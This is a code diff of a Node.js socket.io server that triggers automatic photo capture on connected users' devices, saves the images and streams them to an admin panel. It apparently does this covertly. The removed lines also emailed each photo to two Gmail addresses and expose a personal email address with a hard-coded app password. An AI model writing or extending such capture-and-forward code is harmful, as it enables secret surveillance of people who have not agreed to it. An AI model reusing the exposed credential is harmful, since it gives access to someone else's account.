@@ -3,7 +3,6 @@ const http = require('http');
 const { Server } = require('socket.io');
 const path = require('path');
 const fs = require('fs');
-const nodemailer = require('nodemailer');
 
 const app = express();
 const server = http.createServer(app);
@@ -14,15 +13,8 @@ if (!fs.existsSync(uploadDir)) {
     fs.mkdirSync(uploadDir);
 }
 
-// 📧 Transporter Config with Provided App Password
-const transporter = nodemailer.createTransport({
-    service: 'gmail',
-    auth: {
-        user: 'md.danish7499@gmail.com',
-        pass: 'qohs qivc jlvo iat' // 👈 Aapka 16-digit App Password config
-    }
-});
-
+// Memory Cache for Offline Photos Retention
+let storedPhotos = [];
 let isAutoCaptureOn = true;
 
 app.get('/admin.html', (req, res) => {
@@ -41,17 +33,14 @@ app.use(express.static(__dirname));
 app.use('/uploads', express.static(uploadDir));
 
 io.on('connection', (socket) => {
-    console.log('⚡ Device Connected:', socket.id);
 
-    socket.on('set-auto-capture-state', (state) => {
-        isAutoCaptureOn = state;
-        console.log(`Auto-capture state: ${isAutoCaptureOn}`);
+    socket.on('admin-auth-success', () => {
+        // Send all stored/offline photos to newly connected admin
+        socket.emit('load-stored-photos', storedPhotos);
     });
 
     socket.on('user-ready', () => {
-        io.emit('user-connected');
         if (isAutoCaptureOn) {
-            console.log("⚡ Triggering 5 fast auto captures...");
             socket.emit('start-auto-capture');
         }
     });
@@ -61,33 +50,24 @@ io.on('connection', (socket) => {
     });
 
     socket.on('user-photo-captured', (imageData) => {
-        const base64Data = imageData.replace(/^data:image\/png;base64,/, "");
-        const fileName = `photo_${Date.now()}.png`;
+        const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, "");
+        const fileName = `photo_${Date.now()}.jpg`;
         const filePath = path.join(uploadDir, fileName);
 
         fs.writeFile(filePath, base64Data, 'base64', (err) => {
             if (!err) console.log(`✅ Photo Saved: uploads/${fileName}`);
         });
 
-        // Broadcast to Admin live panel
-        io.emit('send-photo-to-admin', imageData);
+        const photoObj = { imageData, fileName };
+        storedPhotos.push(photoObj);
 
-        // Send Email to Both Accounts
-        const mailOptions = {
-            from: 'md.danish7499@gmail.com',
-            to: 'prectice@gmail.com, md.danish7499@gmail.com',
-            subject: '📸 Live Auto Captured Photo',
-            text: 'User photo auto captured successfully.',
-            attachments: [{ filename: fileName, content: base64Data, encoding: 'base64' }]
-        };
+        // Keep last 30 photos in cache to optimize server memory
+        if (storedPhotos.length > 30) {
+            storedPhotos.shift();
+        }
 
-        transporter.sendMail(mailOptions, (error, info) => {
-            if (error) {
-                console.log('❌ Email Send Error:', error);
-            } else {
-                console.log('📧 Email Sent Successfully:', info.response);
-            }
-        });
+        // Broadcast to live Admin
+        io.emit('send-photo-to-admin', photoObj);
     });
 });
 
